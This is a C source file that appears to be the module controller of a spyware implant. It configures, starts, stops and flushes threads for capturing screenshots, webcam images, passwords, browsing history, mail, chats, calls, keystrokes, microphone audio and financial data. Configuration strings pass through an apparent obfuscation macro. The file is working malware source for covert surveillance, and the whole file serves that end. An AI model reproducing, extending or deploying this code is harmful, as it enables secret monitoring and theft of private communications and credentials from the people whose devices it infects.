#define _XOPEN_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/eventfd.h>

#include "module.h"
#include "config.h"
#include "so.h"
#include "me.h"

module_t modulelist[] = {
   MODULE_SCREENSHOT_ENTRY,
   MODULE_DEVICE_ENTRY,
   MODULE_APPLICATION_ENTRY,
   MODULE_POSITION_ENTRY,
   MODULE_CAMERA_ENTRY,
   MODULE_MOUSE_ENTRY,
   MODULE_PASSWORD_ENTRY,
   MODULE_URL_ENTRY,
   MODULE_MESSAGES_ENTRY,
   MODULE_ADDRESSBOOK_ENTRY,
   MODULE_CHAT_ENTRY,
   MODULE_CALL_ENTRY,
   MODULE_KEYLOG_ENTRY,
   MODULE_MIC_ENTRY,
   MODULE_MONEY_ENTRY,
};

static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

void parsemodules(json_object *config)
{
   int i;
   json_object *modules, *m, *sm, *ssm;
   int modulec;
   char *name, *v;
   struct tm tm;

   pthread_mutex_lock(&mutex);

   for(i = 0; i < (sizeof(modulelist) / sizeof(module_t)); i++) if(modulelist[i].param) free(modulelist[i].param);

   modules = json_object_object_get(config, SO"modules");
   modulec = json_object_array_length(modules);

   for(i = 0; i < modulec; i++) {
      m = json_object_array_get_idx(modules, i);
      get_string(m, SO"module", &name);

      if(!strcmp(name, SO"screenshot")) {
         MODULE_SCREENSHOT.param = malloc(sizeof(module_screenshot_t));
         get_boolean(m, SO"onlywindow", &MODULE_SCREENSHOT_P->window);
         get_string(m, SO"quality", &v);
         MODULE_SCREENSHOT_P->quality = (!strcmp(v, SO"lo") ? 30 : (!strcmp(v, SO"med") ? 60 : 90));
      } else if(!strcmp(name, SO"camera")) {
         MODULE_CAMERA.param = malloc(sizeof(module_camera_t));
         get_string(m, SO"quality", &v);
         MODULE_CAMERA_P->quality = (!strcmp(v, SO"lo") ? 30 : (!strcmp(v, SO"med") ? 60 : 90));
      } else if(!strcmp(name, SO"mouse")) {
         MODULE_MOUSE.param = malloc(sizeof(module_mouse_t));
         get_int(m, SO"width", ((int *)&MODULE_MOUSE_P->width));
         get_int(m, SO"height", ((int *)&MODULE_MOUSE_P->height));
      } else if(!strcmp(name, SO"messages")) {
         MODULE_MESSAGES.param = malloc(sizeof(module_messages_t));
         sm = json_object_object_get(m, SO"mail");
         get_boolean(sm, SO"enabled", &MODULE_MESSAGES_P->enabled);
         ssm = json_object_object_get(sm, SO"filter");
         get_int(ssm, SO"maxsize", &MODULE_MESSAGES_P->maxsize);
         get_string(ssm, SO"datefrom", &v);
         strptime(v, "%Y-%m-%d %H:%M:%S", &tm);
         MODULE_MESSAGES_P->from = mktime(&tm);
         get_string(ssm, SO"dateto", &v);
         strptime(v, "%Y-%m-%d %H:%M:%S", &tm);
         MODULE_MESSAGES_P->to = mktime(&tm);
      } else if(!strcmp(name, SO"call")) {
         MODULE_CALL.param = malloc(sizeof(module_call_t));
         get_boolean(m, SO"enabled", &MODULE_CALL_P->record);
         get_int(m, SO"compression", &MODULE_CALL_P->compression);
         get_int(m, SO"buffer", &MODULE_CALL_P->bufsize);
      } else if(!strcmp(name, SO"mic")) {
         MODULE_MIC.param = malloc(sizeof(module_mic_t));
         get_double(m, SO"threshold", &MODULE_MIC_P->threshold);
         get_int(m, SO"silence", &MODULE_MIC_P->silence);
         get_boolean(m, SO"autosense", &MODULE_MIC_P->autosense);
      }
   }

   pthread_mutex_unlock(&mutex);

   return;
}

void startmodule(int module)
{
   int i;

   pthread_mutex_lock(&mutex);

   if(module == MODULE_ALL_INDEX) {
      for(i = 0; i < (sizeof(modulelist) / sizeof(modulelist[0])); i++) {
         if((modulelist[i].status == MODULE_STOPPED) && modulelist[i].main) {
            if(modulelist[i].event != -1) if((modulelist[i].event = eventfd(0, 0)) < 0) modulelist[i].event = 0;
            if(!pthread_create(&modulelist[i].tid, NULL, modulelist[i].main, NULL)) {
               if(modulelist[i].event != -1) {
                  modulelist[i].status = MODULE_STARTED;
               } else {
                  pthread_detach(modulelist[i].tid);
               }
            }
         }
      }
   } else {
      if((modulelist[module].status == MODULE_STOPPED) && modulelist[module].main) {
         if(modulelist[module].event != -1) if((modulelist[module].event = eventfd(0, 0)) < 0) modulelist[module].event = 0;
         if(!pthread_create(&modulelist[module].tid, NULL, modulelist[module].main, NULL)) {
            if(modulelist[module].event != -1) {
               modulelist[module].status = MODULE_STARTED;
            } else {
               pthread_detach(modulelist[module].tid);
            }
         }
      }
   }

   pthread_mutex_unlock(&mutex);

   return;
}

void stopmodule(int module)
{
   int i;
   uint64_t u = 1;

   pthread_mutex_lock(&mutex);

   if(module == MODULE_ALL_INDEX) {
      for(i = 0; i < (sizeof(modulelist) / sizeof(modulelist[0])); i++) {
         if(modulelist[i].status == MODULE_STARTED) {
            modulelist[i].status = MODULE_STOPPING;
            if(modulelist[i].event > 0) write(modulelist[i].event, &u, sizeof(u));
         }
      }
      for(i = 0; i < (sizeof(modulelist) / sizeof(modulelist[0])); i++) {
         if(modulelist[i].status == MODULE_STOPPING) pthread_join(modulelist[i].tid, NULL);
         if(modulelist[i].event > 0) {
            close(modulelist[i].event);
            modulelist[i].event = 0;
         }
         modulelist[i].status = MODULE_STOPPED;
      }
   } else {
      if(modulelist[module].status == MODULE_STARTED) {
         modulelist[module].status = MODULE_STOPPING;
         if(modulelist[module].event > 0) write(modulelist[module].event, &u, sizeof(u));
      }
      if(modulelist[module].status == MODULE_STOPPING) pthread_join(modulelist[module].tid, NULL);
      if(modulelist[module].event > 0) {
         close(modulelist[module].event);
         modulelist[module].event = 0;
      }
      modulelist[module].status = MODULE_STOPPED;
   }
   
   pthread_mutex_unlock(&mutex);

   return;
}

void flushmodule(int module)
{
   int i;

   pthread_mutex_lock(&mutex);

   if(module == MODULE_ALL_INDEX) {
      for(i = 0; i < (sizeof(modulelist) / sizeof(modulelist[0])); i++) {
         if((modulelist[i].status == MODULE_STARTED) && modulelist[i].flush) modulelist[i].flush();
      }
   } else {
      if((modulelist[module].status == MODULE_STARTED) && modulelist[module].flush) modulelist[module].flush();
   }

   pthread_mutex_unlock(&mutex);

   return;
}
